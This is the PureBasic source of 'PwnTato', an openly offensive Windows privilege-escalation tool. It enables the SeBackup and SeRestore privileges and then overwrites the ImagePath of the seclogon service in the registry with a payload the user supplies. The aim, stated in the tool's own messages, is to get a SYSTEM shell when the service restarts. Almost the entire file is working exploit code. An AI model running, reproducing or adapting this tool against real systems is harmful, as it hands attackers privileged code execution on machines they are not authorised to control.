; ===== Constants and Structures =====
#TOKEN_QUERY              = $0008
#TOKEN_ADJUST_PRIVILEGES = $0020
#SE_PRIVILEGE_ENABLED     = $00000002
#KEY_WOW64_64KEY          = $0100
#TokenPrivileges          = 3

Structure LUID
  LowPart.l
  HighPart.l
EndStructure

Structure LUID_AND_ATTRIBUTES
  Luid.LUID
  Attributes.l
EndStructure

Structure TOKEN_PRIVILEGES_FIXED
  PrivilegeCount.l
EndStructure

; ===== Console Color Helpers =====
Procedure success() : ConsoleColor(10, 0) : Print("[+] ") : ConsoleColor(7, 0) : EndProcedure
Procedure fail()    : ConsoleColor(12, 0) : Print("[-] ") : ConsoleColor(7, 0) : EndProcedure
Procedure warn()    : ConsoleColor(6, 0)  : Print("[!] ") : ConsoleColor(7, 0) : EndProcedure
Procedure check()   : ConsoleColor(13, 0) : Print("[*] ") : ConsoleColor(7, 0) : EndProcedure

; ===== Proper Privilege Existence Checker =====
Procedure PrivilegeExists(privName.s)
  Protected hToken, *buffer, bufferSize.l, i
  Protected *TP.TOKEN_PRIVILEGES_FIXED
  Protected *Entry.LUID_AND_ATTRIBUTES
  Protected privLuid.LUID

  If Not LookupPrivilegeValue_(#Null, @privName, @privLuid)
    fail() : PrintN("LookupPrivilegeValue failed: " + privName)
    ProcedureReturn 0
  EndIf

  If Not OpenProcessToken_(GetCurrentProcess_(), #TOKEN_QUERY, @hToken)
    fail() : PrintN("OpenProcessToken failed")
    ProcedureReturn 0
  EndIf

  GetTokenInformation_(hToken, #TokenPrivileges, 0, 0, @bufferSize)
  If bufferSize = 0
    fail() : PrintN("Failed to get buffer size for privileges.")
    CloseHandle_(hToken)
    ProcedureReturn 0
  EndIf

  *buffer = AllocateMemory(bufferSize)
  If Not *buffer
    fail() : PrintN("Memory allocation failed")
    CloseHandle_(hToken)
    ProcedureReturn 0
  EndIf

  If Not GetTokenInformation_(hToken, #TokenPrivileges, *buffer, bufferSize, @bufferSize)
    fail() : PrintN("GetTokenInformation failed")
    FreeMemory(*buffer)
    CloseHandle_(hToken)
    ProcedureReturn 0
  EndIf

  *TP = *buffer
  *Entry = *buffer + SizeOf(LONG)

  For i = 0 To PeekL(*TP) - 1
    If *Entry\Luid\LowPart = privLuid\LowPart And *Entry\Luid\HighPart = privLuid\HighPart
      FreeMemory(*buffer) : CloseHandle_(hToken)
      ProcedureReturn 1
    EndIf
    *Entry + SizeOf(LUID_AND_ATTRIBUTES)
  Next

  FreeMemory(*buffer)
  CloseHandle_(hToken)
  ProcedureReturn 0
EndProcedure

; ===== Enable Privilege If Present =====
Procedure EnablePrivilege(privName.s)
  Protected hToken, privLuid.LUID, TP.TOKEN_PRIVILEGES
  If Not PrivilegeExists(privName)
    fail() : PrintN("User does NOT have privilege: " + privName)
    ProcedureReturn 0
  EndIf

  If OpenProcessToken_(GetCurrentProcess_(), #TOKEN_ADJUST_PRIVILEGES, @hToken)
    If LookupPrivilegeValue_(#Null, @privName, @privLuid)
      TP\PrivilegeCount = 1
      TP\Privileges[0]\Luid = privLuid
      TP\Privileges[0]\Attributes = #SE_PRIVILEGE_ENABLED
      AdjustTokenPrivileges_(hToken, #False, @TP, SizeOf(TOKEN_PRIVILEGES), #Null, #Null)
      If GetLastError_() = 0
        success() : PrintN("Enabled privilege: " + privName)
        CloseHandle_(hToken) : ProcedureReturn 1
      Else
        fail() : PrintN("Failed to enable privilege: " + privName)
      EndIf
    EndIf
    CloseHandle_(hToken)
  EndIf
  ProcedureReturn 0
EndProcedure

Procedure EnableAllPrivileges()
  check() : PrintN("Checking and enabling required privileges...")
  EnablePrivilege("SeBackupPrivilege")
  EnablePrivilege("SeRestorePrivilege")
EndProcedure

; ===== Registry Helpers =====
Procedure.l WriteRegKey(OpenKey.l, SubKey.s, KeySet.s, KeyValue.s)
  Protected hKey.l, Result = 0, Datasize.l = Len(KeyValue)
  If RegCreateKeyEx_(OpenKey, @SubKey, 0, #Null, 0, #KEY_WRITE | #KEY_WOW64_64KEY, 0, @hKey, 0) = 0
    If RegSetValueEx_(hKey, @KeySet, 0, #REG_EXPAND_SZ, @KeyValue, Datasize) = 0
      Result = 1
    EndIf
    RegCloseKey_(hKey)
  EndIf
  ProcedureReturn Result
EndProcedure

Procedure.s ReadRegKey(OpenKey.l, SubKey.s, ValueName.s)
  Protected hKey.l, KeyValue.s = Space(255), Datasize.l = 255
  If RegOpenKeyEx_(OpenKey, @SubKey, 0, #KEY_READ | #KEY_WOW64_64KEY, @hKey) = 0
    If RegQueryValueEx_(hKey, @ValueName, 0, 0, @KeyValue, @Datasize) = 0
      KeyValue = Left(KeyValue, Datasize - 1)
    Else
      KeyValue = "Error Reading Key"
    EndIf
    RegCloseKey_(hKey)
  Else
    KeyValue = "Error Opening Key"
  EndIf
  ProcedureReturn KeyValue
EndProcedure

; ===== Banner =====
Procedure ShowBanner()
  ConsoleColor(14, 0)
  PrintN(#TAB$ + "    ██▒▒████████████████▒▒██")
  PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██")
  PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██")
  PrintN(#TAB$ + "    ██▒▒██  ▒▒▒▒▒▒▒▒  ██▒▒██")
  PrintN(#TAB$ + "    ██▒▒████▒▒▒▒▒▒▒▒████▒▒██")
  PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██")
  PrintN(#TAB$ + "    ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████")
  PrintN(#TAB$ + "      ████████████████████")
  ConsoleColor(10, 0) : PrintN(#TAB$ + "              v1.0")
  ConsoleColor(14, 0) : Print(#TAB$ + "       PwnTato by ")
  ConsoleColor(12, 0) : PrintN("@duty1g" + #CRLF$)
  ConsoleColor(7, 0)
EndProcedure

; ===== Main =====
OpenConsole()
ConsoleTitle("PwnTato 1.0")
EnableGraphicalConsole(0)
ClearConsole()

ShowBanner()
EnableAllPrivileges()

warn() : Print("Enter your seclogon payload: ")
payload$ = Input()

If WriteRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath", payload$)
  check() : Print("Verifying written key..." + #CRLF$)
  If ReadRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath") = payload$
    success() : Print("Payload written successfully." + #CRLF$)
    warn() : Print("Relogin or restart service to trigger shell." + #CRLF$)
  Else
    fail() : Print("Mismatch: value read back does not match payload." + #CRLF$)
  EndIf
Else
  fail() : Print("Failed to write registry key." + #CRLF$)
EndIf

CloseConsole()
